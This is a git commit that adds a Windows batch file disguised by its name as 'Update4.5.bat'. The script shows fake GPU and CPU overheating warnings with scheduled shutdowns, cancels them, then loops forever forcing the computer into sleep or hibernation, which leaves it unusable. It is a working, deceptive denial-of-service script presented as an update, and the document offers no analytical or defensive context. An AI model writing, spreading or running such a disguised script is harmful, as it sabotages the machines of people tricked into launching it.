e684bf43c1dbe0947eb3956708a5e2f692c38e72
Damien <60195761+Damien-code@users.noreply.github.com>
2022-02-04 17:10:11 +0100

    Add files via upload

---
+++ Update4.5.bat
@@ -0,0 +1,14 @@
+@echo off
+timeout /t 20
+shutdown /s /t 99 /c " Surchauffe GPU. "
+timeout /t 5
+shutdown /a
+timeout /t 10
+shutdown /s /t 99 /c " Surchauffe CPU. "
+timeout /t 5
+shutdown /a
+timeout /t 3
+:loop
+%windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+%windir%\System32\rundll32.exe powrprof.dll,SetSuspendState 0,1,0
+goto loop
